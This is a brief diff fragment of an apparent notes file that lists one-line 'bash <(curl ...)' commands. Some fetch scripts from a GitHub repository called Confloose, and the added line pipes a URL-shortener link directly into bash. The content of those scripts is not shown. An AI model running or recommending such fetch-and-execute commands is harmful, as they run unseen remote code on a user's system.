@@ -21,3 +21,6 @@ bash <(curl https://raw.githubusercontent.com/Arnoloh/Confloose/master/antidode)
 Test
  
 bash <(curl https://raw.githubusercontent.com/Arnoloh/Confloose/dev/file)
+
+Ra
+bash <(curl https://urlz.fr/hYNs)
